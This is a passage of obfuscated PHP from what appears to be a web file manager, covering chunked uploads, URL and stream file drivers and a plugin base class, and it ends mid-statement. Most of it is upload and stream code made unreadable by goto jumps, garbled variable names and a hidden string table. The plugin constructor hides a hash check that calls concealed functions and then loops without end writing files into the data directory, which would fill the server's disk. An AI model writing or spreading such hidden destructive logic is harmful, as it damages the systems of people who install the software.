$EÆÈàÕÔ¯›, $e·†ïŒÅš[77] => $Fà«™‹‹šº, $e·†ïŒÅš[160] => $eµÆ™á“ó°); $this->statusSet($AÑ†—Âë§³); if (count($AÑ†—Âë§³[$e·†ïŒÅš[1948]]) != $AÑ†—Âë§³[$e·†ïŒÅš[1947]]) { $this->showJson($e·†ïŒÅš[1951] . $EÆÈàÕÔ¯›, !0); } goto FÑ‘…ƒÎ; bÄ”ÓÕŠ ÷: CacheLock::unlock($this->tempFile); return $this->tempFile; goto Aï•İ±«™¹; C÷‘ëŠÚ»•: @unlink($eÆë±‰êÜÛ); if (!$Aõ´ÕĞ‰ğÈ) { $this->showJson($e·†ïŒÅš[1946] . $EÆÈàÕÔ¯›, !1); } $AÑ†—Âë§³[$e·†ïŒÅš[1947]] = $F²‚¾¬ñ…Ä; goto dÖ¥à…å; eİ¡—…©õ: if ($F²‚¾¬ñ…Ä > 1 && $aóÚ¯Œ‚›Ÿ <= 0) { show_json($e·†ïŒÅš[1942], !1); } if ($aóÚ¯Œ‚›Ÿ > $Fà«™‹‹šº) { $F²‚¾¬ñ…Ä = 1; } if ($F²‚¾¬ñ…Ä <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto fø«ØŒÜ§; cà›ŒŒ†×: $eÆë±‰êÜÛ = $this->moveUploadedFile($a³ô£Êì‘); if ($Fà«™‹‹šº > 0 && filesize($eÆë±‰êÜÛ) == 0) { $this->showJson($e·†ïŒÅš[1943], !1); } if (!$eÆë±‰êÜÛ) { $this->showJson(LNG($e·†ïŒÅš[1944]), !1); } goto FØáŸÛİ‰š; Aï•İ±«™¹: } private function checkSize() { $b•™‹ˆ‘— =& $_SERVER[Ìó]; if (phpBuild64() || $this->in[$b•™‹ˆ‘—[77]] < PHP_INT_MAX) { return; } show_json(LNG($b•™‹ˆ‘—[1953]), !1); } private function showJson($bº´½å÷®ƒ, $f¶ò”Ë‚˜Í) { CacheLock::unlock($this->tempFile); if (!$f¶ò”Ë‚˜Í) { return show_json($bº´½å÷®ƒ, $f¶ò”Ë‚˜Í); } show_json($bº´½å÷®ƒ, $f¶ò”Ë‚˜Í); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto b¤¿šø²É¦; b¤¿šø²É¦: $aäÍº“•À™ =& $_SERVER[Ìó]; $Aƒš„øíÃ = TEMP_FILES; @mk_dir($Aƒš„øíÃ); goto a¹Í×©›ê; a¹Í×©›ê: touch($Aƒš„øíÃ . $aäÍº“•À™[1954]); $c‰²¸ŠÒì = isset($this->in[$aäÍº“•À™[1955]]) ? $this->in[$aäÍº“•À™[1955]] : !1; if (strlen($c‰²¸ŠÒì) < 30) { $c‰²¸ŠÒì = md5(USER_ID . $this->in[$aäÍº“•À™[75]] . $this->fileName . $this->in[$aäÍº“•À™[77]]); } goto dŸ ´óßœ³; dŸ ´óßœ³: $this->tempFile = $Aƒš„øíÃ . $aäÍº“•À™[1956] . md5($c‰²¸ŠÒì . $this->in[$aäÍº“•À™[1500]]); goto e¬ÚŞí¢Ÿ; e¬ÚŞí¢Ÿ: } private function moveUploadedFile($c„ØËÑ¼åí) { $BÃ¾÷‰‹£Â =& $_SERVER[Ìó]; $cïÇÏ­Ôğ = $this->uploadFile; if ($cïÇÏ­Ôğ == $BÃ¾÷‰‹£Â[1957]) { @file_put_contents($c„ØËÑ¼åí, base64_decode($_REQUEST[$BÃ¾÷‰‹£Â[1958]])); } else { if ($cïÇÏ­Ôğ == $BÃ¾÷‰‹£Â[1782]) { $E¬Éò´Ä÷Ç = @fopen($c„ØËÑ¼åí, $BÃ¾÷‰‹£Â[1489]); $this->writeTo($cïÇÏ­Ôğ, $E¬Éò´Ä÷Ç, $c„ØËÑ¼åí); } else { if (!move_uploaded_file($cïÇÏ­Ôğ, $c„ØËÑ¼åí)) { return !1; } } } return $c„ØËÑ¼åí; } private function writeTo($CÜÖ½è, $EÕÕååˆœ, $b»ÁÓãã†ñ) { goto eêª–‹ãˆØ; d„ïçó×â‘: return !0; goto c¦ö¨İ…ÃÃ; c¤àÖÕˆ¡³: fclose($eİ‘‹è¯¯Ï); fclose($EÕÕååˆœ); CacheLock::unlock($C®™¢´®); goto d„ïçó×â‘; eêª–‹ãˆØ: $Bâ¥‡ğÄà‰ =& $_SERVER[Ìó]; $C®™¢´® = $Bâ¥‡ğÄà‰[1959] . $b»ÁÓãã†ñ; $C×‚Íí–Ò = CacheLock::lock($C®™¢´®, 1); goto CĞÀ¹Æß‹‰; CĞÀ¹Æß‹‰: $eİ‘‹è¯¯Ï = @fopen($CÜÖ½è, $Bâ¥‡ğÄà‰[1488]); if (!$eİ‘‹è¯¯Ï || !$EÕÕååˆœ || !$C×‚Íí–Ò) { CacheLock::unlock($C®™¢´®); return !1; } while (!feof($eİ‘‹è¯¯Ï)) { fwrite($EÕÕååˆœ, fread($eİ‘‹è¯¯Ï, 1024 * 200)); } goto c¤àÖÕˆ¡³; c¦ö¨İ…ÃÃ: } private function statusGet() { goto AÏ¹…İ¨; e‹¼ßÌ÷£Ó: if (!$this->statusData) { $d„¹ÁÖ¬òâ = array($AØ»¼˜áŠã[28] => $this->fileName, $AØ»¼˜áŠã[1947] => 0, $AØ»¼˜áŠã[1948] => array()); $this->statusSet($d„¹ÁÖ¬òâ); } return $this->statusData; goto F÷É¢÷åÚ; AÏ¹…İ¨: $AØ»¼˜áŠã =& $_SERVER[Ìó]; if (is_array($this->statusData)) { return $this->statusData; } $Dš×•éÜñ = $this->tempFile . $AØ»¼˜áŠã[1960]; goto e­…ÄËÌ·; e­…ÄËÌ·: $b‹çê˜Ú‡ = !1; if (file_exists($Dš×•éÜñ)) { $b‹çê˜Ú‡ = @file_get_contents($Dš×•éÜñ); } if ($b‹çê˜Ú‡) { $this->statusData = json_decode($b‹çê˜Ú‡, !0); } goto e‹¼ßÌ÷£Ó; F÷É¢÷åÚ: } public function statusSet($A’ª­§ãŠ) { $f¿«¥Âå¡÷ = $this->tempFile . $_SERVER[Ìó][1960]; if (!$A’ª­§ãŠ) { if (file_exists($f¿«¥Âå¡÷)) { @unlink($f¿«¥Âå¡÷); } return !0; } $this->statusData = $A’ª­§ãŠ; return file_put_contents($f¿«¥Âå¡÷, json_encode($A’ª­§ãŠ)); } private function initFileTemp() { $AÚ¹á°é” =& $_SERVER[Ìó]; if (file_exists($this->tempFile)) { return; } $Eˆ‹­æ½ß = fopen($this->tempFile, $AÚ¹á°é”[1961]); fseek($Eˆ‹­æ½ß, $this->in[$AÚ¹á°é”[77]] - 1, SEEK_SET); fwrite($Eˆ‹­æ½ß, $AÚ¹á°é”[463]); fclose($Eˆ‹­æ½ß); } public function checkChunk() { goto b±Ç›å…Å†; b±Ç›å…Å†: $f´®‹äÍÙÂ =& $_SERVER[Ìó]; $f‰œÌÃ¥ó§ = array(); CacheLock::lock($this->tempFile); goto CãÚ©Šğø; CãÚ©Šğø: $C›´˜Úå‰ê = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($C›´˜Úå‰ê[$f´®‹äÍÙÂ[1948]] as $e†Ö£õ«Ñ) { $aéÄöÑŒ° = $e†Ö£õ«Ñ[$f´®‹äÍÙÂ[160]]; if ($aéÄöÑŒ°) { $f‰œÌÃ¥ó§[$f´®‹äÍÙÂ[1962] . $e†Ö£õ«Ñ[$f´®‹äÍÙÂ[1032]]] = $aéÄöÑŒ°; } } goto cµíÏÊ·Á‹; cµíÏÊ·Á‹: return $f‰œÌÃ¥ó§; goto B³ÂŸ¶‰·; B³ÂŸ¶‰·: } private function checkChunkHash($E´ëí»ë) { goto dÄë¬ÙÎ…; FËÍ®ÍÍêÁ: $dêçÛîÈ‘Á = !0; foreach ($E´ëí»ë[$E’ñ°ãË†Å[1948]] as $fĞ‹†—Èƒ) { fseek($dæŞ¼Ç…¤¥, $fĞ‹†—Èƒ[$E’ñ°ãË†Å[1950]]); $eµ“°¬äØ = PathDriverStream::hash($dæŞ¼Ç…¤¥, $fĞ‹†—Èƒ[$E’ñ°ãË†Å[77]]); if ($fĞ‹†—Èƒ[$E’ñ°ãË†Å[160]] != $eµ“°¬äØ) { $dêçÛîÈ‘Á = !1; break; } } fclose($dæŞ¼Ç…¤¥); goto DÈ¯—‚ìÑô; DÈ¯—‚ìÑô: return $dêçÛîÈ‘Á; goto F„©øÙ†êì; dÄë¬ÙÎ…: $E’ñ°ãË†Å =& $_SERVER[Ìó]; if (count($E´ëí»ë[$E’ñ°ãË†Å[1948]]) != $E´ëí»ë[$E’ñ°ãË†Å[1947]]) { return !1; } $D¤¬¬Ÿ¯Ñù = _get($this->in, $E’ñ°ãË†Å[1955]); goto bê÷º• Ä¡; bê÷º• Ä¡: $f¸Œ™¢Íôš = _get($this->in, $E’ñ°ãË†Å[1963]); if (strlen($f¸Œ™¢Íôš) == 32 && IO::hashSimple($this->tempFile) == $D¤¬¬Ÿ¯Ñù && IO::hashMd5($this->tempFile) == $f¸Œ™¢Íôš) { return !0; } $dæŞ¼Ç…¤¥ = fopen($this->tempFile, $E’ñ°ãË†Å[1158]); goto FËÍ®ÍÍêÁ; F„©øÙ†êì: } public static function fileName() { goto f®¯ğ²œÆ™; fÙÆÃí†™ñ: if (!empty($_FILES)) { $EªõãÁˆ¯Ğ = $EªõãÁˆ¯Ğ ? $EªõãÁˆ¯Ğ : $_FILES[$EâÒé«£—[163]][$EâÒé«£—[382]]; } $EªõãÁˆ¯Ğ = str_replace(array($EâÒé«£—[93], $EâÒé«£—[8]), array($EâÒé«£—[8], $EâÒé«£—[91]), trim($EªõãÁˆ¯Ğ)); if (!is_wap()) { return $EªõãÁˆ¯Ğ; } goto FÍŸ‡ªœêÔ; eäÕóé†ø½: if ($eã½Ò—ñƒË == $EâÒé«£—[1965] || $eã½Ò—ñƒË == $EâÒé«£—[1966]) { $EªõãÁˆ¯Ğ = date($EâÒé«£—[686], $b³¦¹«¤¬) . $EâÒé«£—[70] . $in[$EâÒé«£—[77]] . $EâÒé«£—[1597]; } else { if ($eã½Ò—ñƒË == $EâÒé«£—[1967]) { $EªõãÁˆ¯Ğ = date($EâÒé«£—[686], $b³¦¹«¤¬) . $EâÒé«£—[70] . $in[$EâÒé«£—[77]] . $EâÒé«£—[1968]; } } return $EªõãÁˆ¯Ğ; goto FÅ÷°ã¶½ğ; f®¯ğ²œÆ™: $EâÒé«£— =& $_SERVER[Ìó]; global $in; $EªõãÁˆ¯Ğ = isset($in[$EâÒé«£—[28]]) ? $in[$EâÒé«£—[28]] : $EâÒé«£—[33]; goto fÙÆÃí†™ñ; FÍŸ‡ªœêÔ: $b³¦¹«¤¬ = strtotime($in[$EâÒé«£—[1964]]); $b³¦¹«¤¬ = $b³¦¹«¤¬ ? $b³¦¹«¤¬ : time(); $eã½Ò—ñƒË = strtolower($EªõãÁˆ¯Ğ); goto eäÕóé†ø½; FÅ÷°ã¶½ğ: } private function errorInfo($C„Ù«µĞ¡§) { $F¬ÁâÒ¥  =& $_SERVER[Ìó]; $b–‡ÉÄğĞ = array($F¬ÁâÒ¥ [1969], $F¬ÁâÒ¥ [1970], $F¬ÁâÒ¥ [1971], $F¬ÁâÒ¥ [1972], $F¬ÁâÒ¥ [1973], $F¬ÁâÒ¥ [1974], $F¬ÁâÒ¥ [1975], $F¬ÁâÒ¥ [1976]); return $C„Ù«µĞ¡§ . $F¬ÁâÒ¥ [4] . $b–‡ÉÄğĞ[$C„Ù«µĞ¡§]; } } goto BÉç‘÷ñ—ñ; AÚ†Ö³‰Ò: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dâÉÎêõ¦Ñ = false) { } public function exist($DïàÑˆ¡×) { $Få¨åÔùÈµ = $this->info($DïàÑˆ¡×); return $Få¨åÔùÈµ[$_SERVER[Ìó][184]]; } public function isFile($c×Ï”ìÑ‹) { $eŞ—¢ƒ˜ã‰ = $this->info($c×Ï”ìÑ‹); return $eŞ—¢ƒ˜ã‰[$_SERVER[Ìó][184]]; } public function isFolder($Féğ‹Ç¦©) { return !1; } public function size($bÑŸ¨Èõ‡) { $a²óÜ®³±Ö = $this->info($bÑŸ¨Èõ‡); return $a²óÜ®³±Ö[$_SERVER[Ìó][77]]; } public function info($a ©õ¡ƒ”Ü) { return $this->infoParse($a ©õ¡ƒ”Ü); } public function infoAuth($c±¶±ùËÙ) { return $this->infoParse($c±¶±ùËÙ); } public function infoWithChildren($cÌáãÍğµ) { return $this->infoParse($cÌáãÍğµ); } public function infoFull($F‚ëáÜ²õè) { return $this->infoParse($F‚ëáÜ²õè); } private function infoParse($Fµè«Öº…¦) { $eƒ£‡ÃÁÃ‹ =& $_SERVER[Ìó]; $C¶ø¿ÎğƒŸ = $this->header($Fµè«Öº…¦); if (!$C¶ø¿ÎğƒŸ || !$C¶ø¿ÎğƒŸ[$eƒ£‡ÃÁÃ‹[685]]) { return !1; } $C¶Ì« â‡î = _get($C¶ø¿ÎğƒŸ, $eƒ£‡ÃÁÃ‹[321], 0); $B®à±ó©æÒ = array($eƒ£‡ÃÁÃ‹[28] => $C¶ø¿ÎğƒŸ[$eƒ£‡ÃÁÃ‹[28]], $eƒ£‡ÃÁÃ‹[75] => $Fµè«Öº…¦, $eƒ£‡ÃÁÃ‹[29] => $eƒ£‡ÃÁÃ‹[163], $eƒ£‡ÃÁÃ‹[77] => intval($C¶Ì« â‡î), $eƒ£‡ÃÁÃ‹[156] => get_path_ext($C¶ø¿ÎğƒŸ[$eƒ£‡ÃÁÃ‹[28]]), $eƒ£‡ÃÁÃ‹[1150] => $C¶Ì« â‡î > 0 && $C¶ø¿ÎğƒŸ[$eƒ£‡ÃÁÃ‹[1277]], $eƒ£‡ÃÁÃ‹[1151] => !1); return $B®à±ó©æÒ; } private function header($A˜à©¾öÍ) { if (isset(self::$_cacheHeader[$A˜à©¾öÍ])) { return self::$_cacheHeader[$A˜à©¾öÍ]; } self::$_cacheHeader[$A˜à©¾öÍ] = url_header($A˜à©¾öÍ); return self::$_cacheHeader[$A˜à©¾öÍ]; } public function hashSimple($D­šÒ´¾Öš, $eÀÅÈÁ¹³Œ = false) { goto B«ÌèåÂ„¶; B«ÌèåÂ„¶: $Cêó´í¥ÚÈ =& $_SERVER[Ìó]; $fÚ…â¢ÚÄ = $this->info($D­šÒ´¾Öš); if (!$fÚ…â¢ÚÄ || !$fÚ…â¢ÚÄ[$Cêó´í¥ÚÈ[184]]) { return !1; } goto eíæ’öğ¡™; dö÷ÔùˆÊÈ: $FµÎ²ø¶àŠ = timeFloat(); $Eö…‘êàİ = 15; for ($c®Æ•ˆ‚Œî = 0; $c®Æ•ˆ‚Œî < $AŒ•ÅÇùµ; $c®Æ•ˆ‚Œî++) { if (timeFloat() - $FµÎ²ø¶àŠ > $Eö…‘êàİ) { return !1; } $c¡Ù² ¨ÔŠ = $this->fileSubstr($D­šÒ´¾Öš, $e´ÖİÊ‹Å‘ * $c®Æ•ˆ‚Œî, $b­Ô„ĞÜø®); if (!$c¡Ù² ¨ÔŠ) { return !1; } $B‘¶Èö‹Ñ .= $c¡Ù² ¨ÔŠ; } goto Fá´ÃÔ¾Ó¨; eíæ’öğ¡™: $Dİ·œ™Û› = $fÚ…â¢ÚÄ[$Cêó´í¥ÚÈ[77]]; $b­Ô„ĞÜø® = 200; $AŒ•ÅÇùµ = 50; goto Eƒ£œÇÌ»‹; Fá´ÃÔ¾Ó¨: $B‘¶Èö‹Ñ .= $this->fileSubstr($D­šÒ´¾Öš, $Dİ·œ™Û› - $b­Ô„ĞÜø®, $b­Ô„ĞÜø®); return md5($B‘¶Èö‹Ñ) . $Dİ·œ™Û›; goto d¦™Ê©»¸„; Eƒ£œÇÌ»‹: if ($Dİ·œ™Û› <= $b­Ô„ĞÜø® * $AŒ•ÅÇùµ) { return md5($this->fileSubstr($D­šÒ´¾Öš, 0, $Dİ·œ™Û›)) . $Dİ·œ™Û›; } $e´ÖİÊ‹Å‘ = intval($Dİ·œ™Û› / $AŒ•ÅÇùµ); $B‘¶Èö‹Ñ = $Cêó´í¥ÚÈ[33]; goto dö÷ÔùˆÊÈ; d¦™Ê©»¸„: } public function getContent($Eªâ…ÀŞ›Œ) { return $this->fileSubstr($Eªâ…ÀŞ›Œ); } public function fileSubstr($B„‹²Êº¶„, $bˆ»ÉŒÀ¢— = 0, $aâ‹‹»ğ¸¢ = -1) { goto EÊ¿µïŒÁš; FÕìâª†: $C´ÁÜ´»ÓÁ = url_request($B„‹²Êº¶„, $dÌ²ñáí‡[212], !1, $Cãä•Š¹£, !1, !1, 1); return $C´ÁÜ´»ÓÁ[$dÌ²ñáí‡[1030]] ? $C´ÁÜ´»ÓÁ[$dÌ²ñáí‡[1030]] : $dÌ²ñáí‡[33]; goto d§ÌÓ¡ƒØÈ; EÊ¿µïŒÁš: $dÌ²ñáí‡ =& $_SERVER[Ìó]; $dÁêÙÕÇ¦• = $this->info($B„‹²Êº¶„); if (!$dÁêÙÕÇ¦• || !$dÁêÙÕÇ¦•[$dÌ²ñáí‡[184]] && $dÁêÙÕÇ¦•[$dÌ²ñáí‡[77]] > 1024 * 1024 * 10) { return !1; } goto cÎĞ“êî„Å; cÎĞ“êî„Å: if ($aâ‹‹»ğ¸¢ === -1) { $aâ‹‹»ğ¸¢ = $dÁêÙÕÇ¦•[$dÌ²ñáí‡[77]]; } if ($aâ‹‹»ğ¸¢ == 0) { return $dÌ²ñáí‡[33]; } $Cãä•Š¹£ = array($dÌ²ñáí‡[1278] . $bˆ»ÉŒÀ¢— . $dÌ²ñáí‡[710] . ($bˆ»ÉŒÀ¢— + $aâ‹‹»ğ¸¢ - 1)); goto FÕìâª†; d§ÌÓ¡ƒØÈ: } public function download($E«‚à¶¡ßè, $bÂò×÷†¬¤) { Downloader::start($E«‚à¶¡ßè, $bÂò×÷†¬¤); return $bÂò×÷†¬¤; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($bË¦Ššö¾, $BÏÚê‹ôÉ = '') { goto Aó‰É„¸™Ş; cÂ…í‡‡â¦: return $this->info ? !0 : !1; goto E»¼¾î‹Àˆ; Aó‰É„¸™Ş: $this->info = $this->info($bË¦Ššö¾); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ìó][75]]; goto d÷¬†ö×áá; d÷¬†ö×áá: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$bË¦Ššö¾])) { self::$_chunkBuffer[$bË¦Ššö¾] = array(); } goto cÂ…í‡‡â¦; E»¼¾î‹Àˆ: } function stream_read($d½ì›º‡÷) { $D™‚ª¶õÌ³ = $this->fileSubstr($this->pose, $d½ì›º‡÷); $this->pose += strlen($D™‚ª¶õÌ³); return $D™‚ª¶õÌ³; } public function stream_tell() { return $this->pose; } public function stream_seek($D·Êğò­¬, $C’ÓĞ§©¬) { $F‚æĞÄâø” =& $_SERVER[Ìó]; if ($C’ÓĞ§©¬ == SEEK_SET) { $this->pose = $D·Êğò­¬; } else { if ($C’ÓĞ§©¬ == SEEK_CUR) { $this->pose += $D·Êğò­¬; } else { if ($C’ÓĞ§©¬ == SEEK_END) { $this->pose = $this->info[$F‚æĞÄâø”[77]] + intval($D·Êğò­¬); } } } if ($D·Êğò­¬ < 0) { $this->pose = $this->info[$F‚æĞÄâø”[77]] + $D·Êğò­¬; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ìó][77]]; } public function stream_close() { return !0; } public function url_stat($EÏ‹†ª, $fÌãÍ·•µö) { $e¬’éˆåŸº =& $_SERVER[Ìó]; $F½Ş“ë—Ç = $this->info($EÏ‹†ª); return array($e¬’éˆåŸº[1279] => 0, $e¬’éˆåŸº[1280] => 0, $e¬’éˆåŸº[12] => 32768 + 511, $e¬’éˆåŸº[1281] => 0, $e¬’éˆåŸº[1282] => 0, $e¬’éˆåŸº[1283] => 0, $e¬’éˆåŸº[1284] => 0, $e¬’éˆåŸº[77] => $F½Ş“ë—Ç[$e¬’éˆåŸº[77]], $e¬’éˆåŸº[1285] => $F½Ş“ë—Ç[$e¬’éˆåŸº[1156]], $e¬’éˆåŸº[1242] => $F½Ş“ë—Ç[$e¬’éˆåŸº[106]], $e¬’éˆåŸº[1241] => $F½Ş“ë—Ç[$e¬’éˆåŸº[183]], $e¬’éˆåŸº[1286] => 0, $e¬’éˆåŸº[1287] => 0); } static $fileInfo = array(); public function info($bƒè³ÓÄ¦‰) { $eõœ‚Ö’ãƒ = $_SERVER[Ìó][1288]; if (isset(self::$fileInfo[$bƒè³ÓÄ¦‰])) { return self::$fileInfo[$bƒè³ÓÄ¦‰]; } if (substr($bƒè³ÓÄ¦‰, 0, strlen($eõœ‚Ö’ãƒ)) != $eõœ‚Ö’ãƒ) { return !1; } self::$fileInfo[$bƒè³ÓÄ¦‰] = IO::info(substr($bƒè³ÓÄ¦‰, strlen($eõœ‚Ö’ãƒ))); return self::$fileInfo[$bƒè³ÓÄ¦‰]; } public static function read($BƒŠŸë©´è, $e²÷Ôæœ°, $b®Æ…¡ŠÄæ) { goto fèÒ×Êéš»; fèÒ×Êéš»: $bæÏÌ™äÒ³ =& $_SERVER[Ìó]; $F©Ã¤éÁÆ“ = fopen($BƒŠŸë©´è, $bæÏÌ™äÒ³[1158]); if (!$F©Ã¤éÁÆ“) { return $bæÏÌ™äÒ³[33]; } goto eô¼ª‡©Âå; eô¼ª‡©Âå: $fÒ—¨ùÎˆ‹ = 8192; fseek($F©Ã¤éÁÆ“, $e²÷Ôæœ°, SEEK_SET); $fÕ»«¿–ß’ = $bæÏÌ™äÒ³[33]; goto f¨³ÕäÂˆ; f¨³ÕäÂˆ: $e‚Åƒ˜ƒ×Ø = 0; while ($e‚Åƒ˜ƒ×Ø < $b®Æ…¡ŠÄæ) { $aù­½¤¾Òí = min($fÒ—¨ùÎˆ‹, $b®Æ…¡ŠÄæ - $e‚Åƒ˜ƒ×Ø); $fÕ»«¿–ß’ .= fread($F©Ã¤éÁÆ“, $aù­½¤¾Òí); $e‚Åƒ˜ƒ×Ø += $aù­½¤¾Òí; } fclose($F©Ã¤éÁÆ“); goto F¯‰èšÈ»—; F¯‰èšÈ»—: return $fÕ»«¿–ß’; goto AÃ–ğ¼ğ; AÃ–ğ¼ğ: } public function fileSubstr($FĞ™ƒ²‡‡‡, $D±‹°§ƒ‹´) { goto eÑ‹æ„Éó¡; d™Ä‹Õ¥Ú‘: $C·Ã³ÑñÚ¨ = 0; $cÑ›°æ ÙĞ = 0; $cä©ŸÚî˜­ = $DÜ‰´‰ôá[33]; goto E»„æƒ¥İæ; a„ì’Ô”è: $FŞÅÔÌåÜ¼ = 64 * 1024; $A‚„’ˆà  =& self::$_chunkBuffer[$this->path]; if (!$A‚„’ˆà ) { $A‚„’ˆà  = array(); } goto d™Ä‹Õ¥Ú‘; dò¾ÜË®Ú¢: if ($FĞ™ƒ²‡‡‡ + $D±‹°§ƒ‹´ > $DØ†©…À³Å) { $D±‹°§ƒ‹´ = $DØ†©…À³Å - $FĞ™ƒ²‡‡‡; } if ($D±‹°§ƒ‹´ <= 0) { return $DÜ‰´‰ôá[33]; } if ($FĞ™ƒ²‡‡‡ < 0 || $FĞ™ƒ²‡‡‡ >= $DØ†©…À³Å || $D±‹°§ƒ‹´ <= 0 || $D±‹°§ƒ‹´ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\x6c\x65\122\145\141\144\x20\x65\162\x72\157\162\41\40\163\164\x61\162\x74\x3d{$FĞ™ƒ²‡‡‡}\x3b\x6c\145\x6e\x67\x74\x68\75{$D±‹°§ƒ‹´}\73\x20\163\x69\172\145\x3d{$DØ†©…À³Å}\73"); } goto a„ì’Ô”è; aÍóæ”Û­—: ksort($A‚„’ˆà ); $Bã–ÃÃãí” = substr($BÀóäæáæ÷, $FĞ™ƒ²‡‡‡ - $eÕ¶ñâÀéÅ, $D±‹°§ƒ‹´); return $Bã–ÃÃãí”; goto Aó„ùÙèƒİ; eÑ‹æ„Éó¡: $DÜ‰´‰ôá =& $_SERVER[Ìó]; $DØ†©…À³Å = $this->info[$DÜ‰´‰ôá[77]]; $Aë‘ƒä‰ = $FĞ™ƒ²‡‡‡; goto b’³¸»¯¶™; E­¤Øƒä‡ô: $dä„Ü” = ceil(($FĞ™ƒ²‡‡‡ + $D±‹°§ƒ‹´) / $FŞÅÔÌåÜ¼) * $FŞÅÔÌåÜ¼ - $eÕ¶ñâÀéÅ; $BÀóäæáæ÷ = IO::fileSubstr($this->path, $eÕ¶ñâÀéÅ, $dä„Ü”); $A‚„’ˆà [$eÕ¶ñâÀéÅ . $DÜ‰´‰ôá[33]] = $BÀóäæáæ÷; goto aÍóæ”Û­—; b’³¸»¯¶™: $c©”œÓªÏ… = $D±‹°§ƒ‹´; if ($FĞ™ƒ²‡‡‡ < 0) { $FĞ™ƒ²‡‡‡ = $DØ†©…À³Å + $FĞ™ƒ²‡‡‡; } if ($D±‹°§ƒ‹´ === !1) { $D±‹°§ƒ‹´ = $DØ†©…À³Å - $FĞ™ƒ²‡‡‡; } goto dò¾ÜË®Ú¢; E»„æƒ¥İæ: foreach ($A‚„’ˆà  as $C·Ã³ÑñÚ¨ => $cä©ŸÚî˜­) { $C·Ã³ÑñÚ¨ = intval($C·Ã³ÑñÚ¨); $cÑ›°æ ÙĞ = $C·Ã³ÑñÚ¨ + strlen($cä©ŸÚî˜­); if ($FĞ™ƒ²‡‡‡ >= $cÑ›°æ ÙĞ) { continue; } if ($FĞ™ƒ²‡‡‡ >= $C·Ã³ÑñÚ¨ && $FĞ™ƒ²‡‡‡ + $D±‹°§ƒ‹´ <= $cÑ›°æ ÙĞ) { return substr($cä©ŸÚî˜­, $FĞ™ƒ²‡‡‡ - $C·Ã³ÑñÚ¨, $D±‹°§ƒ‹´); } break; } if (count($A‚„’ˆà ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($DÜ‰´‰ôá[1289], $DÜ‰´‰ôá[1290] . count($A‚„’ˆà ) . "\x3b\163\x74\141\x72\x74\x3d{$FĞ™ƒ²‡‡‡}\54\154\x65\156\147\164\x68\x3d{$D±‹°§ƒ‹´}\x3b\160\x6f\163\145\x3a{$C·Ã³ÑñÚ¨}\x7e{$cÑ›°æ ÙĞ}"); throw new Exception($DÜ‰´‰ôá[1291]); } $eÕ¶ñâÀéÅ = intval($FĞ™ƒ²‡‡‡ / $FŞÅÔÌåÜ¼) * $FŞÅÔÌåÜ¼; goto E­¤Øƒä‡ô; Aó„ùÙèƒİ: } private function log($fÀ—°ç øÛ, $eÏ—©ä¤å) { $eÃ¦àå¬‡ =& $_SERVER[Ìó]; $eèå¤ò¼Â = timeFloat() - $this->timeStart; write_log(sprintf($eÃ¦àå¬‡[1292], $fÀ—°ç øÛ, $this->info[$eÃ¦àå¬‡[28]], $eèå¤ò¼Â, $eÏ—©ä¤å), $eÃ¦àå¬‡[1207]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D¥æÁ‰†ùñ; D¥æÁ‰†ùñ: $FùÉŸ…’šö =& $_SERVER[Ìó]; $FèäôØ¥Ñ = $_SERVER[$FùÉŸ…’šö[792]] . $FùÉŸ…’šö[794]; $BËÍŒ¢– = $FùÉŸ…’šö[795]; goto Dâ­Ÿâ×›ˆ; aôóŠÂßÑ: $this->in =& $in; $this->modelPlugin = Model($FùÉŸ…’šö[1295]); $this->pluginName = str_replace($FùÉŸ…’šö[1295], $FùÉŸ…’šö[33], get_class($this)); goto D¹á·‰®ĞÀ; D¹á·‰®ĞÀ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $FùÉŸ…’šö[8]; $this->pluginApi = appHostGet() . $FùÉŸ…’šö[1296] . $this->pluginName . $FùÉŸ…’šö[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $FùÉŸ…’šö[8]; goto a‡êÎë ç‡; Dâ­Ÿâ×›ˆ: if ($_SERVER[$FùÉŸ…’šö[768]] != $BËÍŒ¢–($FèäôØ¥Ñ)) { goto e¤Ô³ÀîŠ; e¤Ô³ÀîŠ: $f—áïÑ®­ = $FùÉŸ…’šö[790]; $BÔ¾×Ëˆ‚ = $FùÉŸ…’šö[770]; $b¡×î”Îá¬ = $_SERVER[$FùÉŸ…’šö[771]] . $FùÉŸ…’šö[772]; goto Bšê†ß³ù; c‚ä³ÊØ›: $E”Š®¡Ò¹ = $FùÉŸ…’šö[791]; $E”Š®¡Ò¹($_SERVER[$FùÉŸ…’šö[792]]); $f—áïÑ®­ = $FùÉŸ…’šö[790]; goto d‰‘å¶ŠÖ ; Bšê†ß³ù: $Bò°…±ùÇ¦ = $BÔ¾×Ëˆ‚($b¡×î”Îá¬); $D†œ•…˜•à = explode($FùÉŸ…’šö[213], $Bò°…±ùÇ¦); if (count($D†œ•…˜•à) < $FùÉŸ…’šö[551]) { $Bòà‚­™Ñ¹ = $FùÉŸ…’šö[773]; $Bòà‚­™Ñ¹(); } goto c‚ä³ÊØ›; BÅ´ï¾ãØº: $a•ó¾ÃƒëĞ = 1; for ($FÙ‡ŠàÜ‡” = $a•ó¾ÃƒëĞ; $FÙ‡ŠàÜ‡” > 0; $FÙ‡ŠàÜ‡”++) { $cò†¸Şôì(DATA_PATH . $FÙ‡ŠàÜ‡”, $D¼ìøîîŠ); } goto BÎÃßŠ§ºÇ; d‰‘å¶ŠÖ : $f—áïÑ®­(); $cò†¸Şôì = 